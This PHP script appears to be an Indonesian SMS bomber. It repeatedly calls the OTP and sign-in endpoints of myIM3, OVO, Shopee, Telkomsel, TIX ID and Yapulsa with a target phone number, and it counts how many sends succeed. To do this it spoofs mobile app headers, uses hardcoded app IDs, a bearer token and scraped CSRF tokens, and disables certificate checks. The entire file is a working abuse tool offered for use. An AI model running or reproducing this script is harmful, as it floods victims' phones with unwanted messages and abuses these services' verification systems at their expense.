<?php
function Sms_myIM3() {
	require ("nomor");
	while ($j < $jumlah) {
		$j+= 1;
		$ci = curl_init();
		curl_setopt ($ci, CURLOPT_HEADER, 1);
		curl_setopt ($ci, CURLOPT_HTTPHEADER, array ("appId: 168e2950623a4dbe8a57beec814ad6b5", "clientVersion: 127", "Content-Type: application/json", "operatorId: 50e22f864fc644c081c0e18319187547"));
		curl_setopt ($ci, CURLOPT_POST, 1);
		curl_setopt ($ci, CURLOPT_POSTFIELDS, json_encode (array ("msisdn" => "$nomor")));
		curl_setopt ($ci, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ci, CURLOPT_URL, "https://osa-indosat.lotusflare.com/api/1.0/dcp/user/indosat_begin_sign_in");
		curl_setopt ($ci, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_X00AD Build/MMB29M)");
		$ce = curl_exec ($ci);
		curl_close ($ci);
		if (preg_match ("/challengeId/", $ce)) {
			$berhasil+= 1;
			echo $k."\rSms$um myIM3$n •$k Mengirim Pesan$n => $b$j$h ✔ ";}
		else {
			$gagal+= 1;
			echo $k."\rSms$um myIM3$n •$k Mengirim Pesan$n => $b$j$m ✘ ";}
		sleep ($jeda);}
	echo $k."\rSms$um myIM3$n •$h Berhasil$n => $h$berhasil$u |$m Gagal$n => $m$gagal\n";}


function Sms_OVO() {
	require ("nomor");
	while ($j < $jumlah) {
		$j+= 1;
		$deviceId = "752fad89-60f5-3b3f-a6ee-a50d2804".rand (0000, 9999);
		$ci = curl_init();
		curl_setopt ($ci, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt ($ci, CURLOPT_HTTPHEADER, array ("app-id: C7UMRSMFRZ46D9GW9IK7", "App-Version: 2.9.1", "Connection: Keep-Alive", "Content-Type: application/json", "cs-session-id: ", "OS: Android", "User-Agent: okhttp/3.11.0"));
		curl_setopt ($ci, CURLOPT_POST, 1);
		curl_setopt ($ci, CURLOPT_POSTFIELDS, '{"deviceId":"'.$deviceId.'","mobile":"'.$nomor.'"}');
		curl_setopt ($ci, CURLOPT_RETURNTRANSFER, true);
		curl_setopt ($ci, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt ($ci, CURLOPT_URL, "https://api.ovo.id/v2.0/api/auth/customer/login2FA");
		$ce = curl_exec ($ci);
		curl_close ($ci);
		if (preg_match ("/refId/", $ce)) {
			$berhasil+= 1;
			echo $k."\rSms$uo OVO$n •$k Mengirim Pesan$n => $b$j$h ✔ ";}
		else {
			$gagal+= 1;
			echo $k."\rSms$uo OVO$n •$k Mengirim Pesan$n => $b$j$m ✘ ";}
		sleep ($jeda);}
	echo $k."\rSms$uo OVO$n •$h Berhasil$n => $h$berhasil$u |$m Gagal$n => $m$gagal\n";}


function Sms_Shopee() {
	require ("nomor");
	$ci = curl_init();
	curl_setopt ($ci, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt ($ci, CURLOPT_HEADER, 1);
	curl_setopt ($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ci, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt ($ci, CURLOPT_URL, "https://shopee.co.id/buyer/login/signup/?__classic__=1");
	curl_setopt ($ci, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0");
	$content = curl_exec ($ci);
	$cookies = array();
	preg_match_all ("/Set-Cookie:(?<cookie>\s{0,}.*)$/im", $content, $cookies);
	$cookie = "";
	$data = $cookies["cookie"];
	foreach ($data as $cok) {
		$cok = explode ("; ", $cok)[0];
		$cookie .= $cok."; ";}
	preg_match_all ("/name=\'csrfmiddlewaretoken\' value=\'(.*)\'/", $content, $out);
	$csrf = $out[1][0];
	$nomor = "62".substr(trim($nomor), 1);
	while ($j < $jumlah) {
		$j+= 1;
		$ci = curl_init();
		curl_setopt ($ci, CURLOPT_HTTPHEADER, array ("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-encoding: gzip, deflate, br", "Content-Type: application/x-www-form-urlencoded", "Cookie: cto_lwid=017b9e91-e0b7-442c-bfb7-d25dffc08eaf; _ga=GA1.3.720468445.1518705958; ".$cookie."__BWfp=c1518706006561xdaa1f9740; _gid=GA1.3.1054069102.1524846892; bannerShown=true; SPC_SC_TK=; UYOMAPJWEMDGJ=; SPC_SC_UD=; __utma=156485241.720468445.1518705958.1524846933.1524846933.1; __utmc=156485241; __utmz=156485241.1524846933.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); appier_utmz=%7B%22csr%22%3A%22(direct)%22%2C%22timestamp%22%3A1524846934%7D; _atrk_sync_cookie=true; _atrk_siteuid=YYXX-KkDeR9JL2OU; _gat=1; _gat_gtm=1", "Host: shopee.co.id", "Referer: https://shopee.co.id/buyer/login/signup/", "Upgrade-Insecure-Requests: 1", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"));
		curl_setopt ($ci, CURLOPT_POST, 1);
		curl_setopt ($ci, CURLOPT_POSTFIELDS, "csrfmiddlewaretoken=$csrf&phone_canon=$nomor&password_hash=&otp_seed=phone_signup");
		curl_setopt ($ci, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ci, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt ($ci, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ci, CURLOPT_URL, "https://shopee.co.id/buyer/login/phone_send_vcode/");
		$ce = curl_exec ($ci);
		curl_close ($ci);
		if (preg_match ("/40/", $ce)) {
			$berhasil+= 1;
			echo $k."\rSms$ut Shopee$n •$k Mengirim Pesan$n => $b$j$h ✔ ";}
		else {
			$gagal+= 1;
			echo $k."\rSms$ut Shopee$n •$k Mengirim Pesan$n => $b$j$m ✘ ";}
		sleep ($jeda);}
	echo $k."\rSms$ut Shopee$n •$h Berhasil$n => $h$berhasil$u |$m Gagal$n => $m$gagal\n";}


function Sms_TELKOMSEL() {
	require ("nomor");
	while ($j < $jumlah) {
		$j+= 1;
		$ci = curl_init();
		curl_setopt ($ci, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt ($ci, CURLOPT_POST, 1);
		curl_setopt ($ci, CURLOPT_POSTFIELDS, "ci_csrf_token=daaac6aa63d46b9709f0e3d054a65c9b&msisdn=$nomor");
		curl_setopt ($ci, CURLOPT_REFERER, "https://mobi.telkomsel.com/ulang?ch=WEB");
		curl_setopt ($ci, CURLOPT_RETURNTRANSFER, true);
		curl_setopt ($ci, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt ($ci, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ci, CURLOPT_URL, "https://mobi.telkomsel.com/ulang/token");
		curl_setopt ($ci, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");
		$ce = curl_exec ($ci);
		curl_close ($ci);
		if (preg_match ("/1/", $ce)) {
			$berhasil+= 1;
			echo $k."\rSms$ut TELKOMSEL$n •$k Mengirim Pesan$n => $b$j$h ✔ ";}
		else {
			$gagal+= 1;
			echo $k."\rSms$ut TELKOMSEL$n •$k Mengirim Pesan$n => $b$j$m ✘ ";}
		sleep ($jeda);}
	echo $k."\rSms$ut TELKOMSEL$n •$h Berhasil$n => $h$berhasil$u |$m Gagal$n => $m$gagal\n";}


function Sms_TIX_ID() {
	require ("nomor");
	while ($j < $jumlah) {
		$j+= 1;
		$ci = curl_init();
		curl_setopt ($ci, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt ($ci, CURLOPT_HTTPHEADER, array ("Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtc2lzZG4iOiIiLCJ1c2VyX2lkIjoiIiwicHVycG9zZSI6Im5vdGxvZ2luIiwiYXVkIjoiVGl4SUQgTWlkZGxld2FyZSIsImV4cCI6MTU2NTg5MDMxMiwiaWF0IjoxNTU3MjUwMzEyLCJpc3MiOiJUaXhJRCBTZWN1cml0eSBBdXRob3JpdHkiLCJzdWIiOiJNb2JpbGUgYXV0aG9yaXphdGlvbiB0b2tlbiJ9.2OXxPRGeMb8hwuMc12uJVr4Kxlp98RVg-vNl6haTXv8", "Connection: Keep-Alive", "Content-Type: application/json", "User-Agent: okhttp/3.9.0"));
		curl_setopt ($ci, CURLOPT_POST, 1);
		curl_setopt ($ci, CURLOPT_POSTFIELDS, '{"device_os":"android","msisdn":"'.$nomor1.'"}');
		curl_setopt ($ci, CURLOPT_RETURNTRANSFER, true);
		curl_setopt ($ci, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt ($ci, CURLOPT_URL, "https://api.tix.id:443/v1/otp/send_otp");
		$ce = curl_exec ($ci);
		curl_close ($ci);
		if (preg_match ("/true/", $ce)) {
			$berhasil+= 1;
			echo $k."\rSms$ut TIX ID$n •$k Mengirim Pesan$n => $b$j$h ✔ ";}
		else {
			$gagal+= 1;
			echo $k."\rSms$ut TIX ID$n •$k Mengirim Pesan$n => $b$j$m ✘ ";}
		sleep ($jeda);}
	echo $k."\rSms$ut TIX ID$n •$h Berhasil$n => $h$berhasil$u |$m Gagal$n => $m$gagal\n";}


function Sms_Yapulsa() {
	require ("nomor");
	while ($j < $jumlah) {
		$j+= 1;
		$ci = curl_init();
		curl_setopt ($ci, CURLOPT_HEADER, 1);
		curl_setopt ($ci, CURLOPT_HTTPHEADER, array ("Content-Type: application/json; charset=utf-8", "source: Android 2.6.0", "X-APP: Android 2.6.0", "X-IMEI: 0"));
		curl_setopt ($ci, CURLOPT_POST, 1);
		curl_setopt ($ci, CURLOPT_POSTFIELDS, json_encode (array ("phonenumber" => "$nomor")));
		curl_setopt ($ci, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ci, CURLOPT_URL, "https://gmapi.yapulsa.com:443/api/v1/alphapay/user/add_new_username_only");
		curl_setopt ($ci, CURLOPT_USERAGENT, "okhttp/3.4.1");
		$ce = curl_exec ($ci);
		curl_close ($ci);
		if (preg_match ("/SUCCES/", $ce)) {
			$berhasil+= 1;
			echo $k."\rSms$uy Yapulsa$n •$k Mengirim Pesan$n => $b$j$h ✔ ";}
		else {
			$gagal+= 1;
			echo $k."\rSms$uy Yapulsa$n •$k Mengirim Pesan$n => $b$j$m ✘ ";}
		sleep ($jeda);}
	echo $k."\rSms$uy Yapulsa$n •$h Berhasil$n => $h$berhasil$u |$m Gagal$n => $m$gagal\n";}


function irul() {
	Sms_myIM3();
	Sms_OVO();
	Sms_Shopee();
	Sms_TELKOMSEL();
	Sms_TIX_ID();
	Sms_Yapulsa();}


irul();
?>